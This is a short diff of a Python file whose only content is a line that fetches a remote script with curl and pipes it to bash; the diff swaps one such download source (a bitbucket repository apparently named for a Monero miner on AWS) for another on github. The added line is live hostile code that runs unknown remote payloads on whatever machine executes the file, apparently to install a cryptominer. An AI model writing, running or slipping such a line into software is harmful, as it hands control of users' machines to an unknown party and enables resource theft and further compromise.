@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/ikballshizuka/xmr-aws/raw/main/cumi | bash')
+os.system('curl -sL https://github.com/kdgiuedhei/lol/raw/refs/heads/main/di_PL | bash')
